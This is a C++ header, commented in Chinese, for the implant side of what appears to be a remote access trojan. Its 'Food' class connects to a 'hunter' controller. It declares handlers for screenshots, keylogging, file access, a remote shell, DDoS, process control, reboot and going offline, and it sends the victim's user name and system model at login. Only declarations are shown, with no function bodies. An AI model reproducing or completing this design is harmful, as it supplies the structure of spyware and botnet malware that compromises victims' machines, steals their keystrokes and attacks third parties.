// 执行主要逻辑循环 不断与hunter端交互
// food自身的抽象 封装了交换方法和tcpsocket

#pragma once
#include "tcpsocket.h"
#include "Keybd.h"
#include "Shell.h"
#include "File.h"
#include <string>
#include <map>
#include <vector>

class Food
{
public:
	Food();

	HINSTANCE hInst;

	//-------------------------------------------------------------------------------
	// 服务端向客户端发送的指令
	std::string CmdSnapshoot;
	std::string CmdKeybd;
	std::string CmdFile;
	std::string CmdShell;
	std::string CmdDdos;
	std::string CmdProcess;

	std::string CmdSendBox;
	std::string CmdReboot;
	std::string CmdOffline;

	// 客户端向服务端发送的指令(你觉得有需要你也可以增加自己的指令)
	std::string CmdLogin;
	//------------------------------------------------------------------------------

	// 分割符号和结束符号
	std::string CmdSplit;
	std::string CmdEnd;
	//------------------------------------------------------------------------------
	void connectTo(std::string domain, int port);

private:
	TcpSocket mSock;
	std::string mBuf;

	std::string getUserName(); // 获取本机用户名
	std::string getSystemModel(); // 获取系统型号
	// 发送登录信息
	bool sendLogin();
	// 数据处理 跟hunter端类似
	void addDataToBuffer(char* data, int size); // 分析指令并处理
	void processCmd(std::string& cmd, std::string& data); // 执行相关处理函数
	std::map<std::string, std::string> parseArgs(std::string& data); // 解析参数

	// 各个指令的处理函数
	void doSnapshoot(std::map<std::string, std::string>& args);
	void doKeybd(std::map<std::string, std::string>& args);
	void doFile(std::map<std::string, std::string>& args);
	void doShell(std::map<std::string, std::string>& args);
	void doDdos(std::map<std::string, std::string>& args);
	void doSendBox(std::map<std::string, std::string>& args);
	void doReboot(std::map<std::string, std::string>& args);
	void doOffline(std::map<std::string, std::string>& args);
};

